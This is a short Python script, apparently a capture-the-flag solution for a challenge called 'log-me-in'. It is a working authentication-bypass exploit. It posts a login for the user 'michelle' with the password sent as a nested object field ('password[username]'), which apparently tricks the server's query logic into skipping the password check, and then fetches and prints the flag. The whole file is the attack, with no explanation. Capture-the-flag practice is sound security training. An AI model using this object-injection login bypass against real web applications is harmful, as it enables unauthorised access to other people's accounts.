#!/usr/bin/env python3
import requests

url = "https://log-me-in.web.ctfcompetition.com/"

s = requests.Session()

r = s.post(url + "login", data = {

		"username": "michelle",
		"password[username]": "jisdnik"
	})

r=s.get(url + "flag")
print(r.text)


s.close()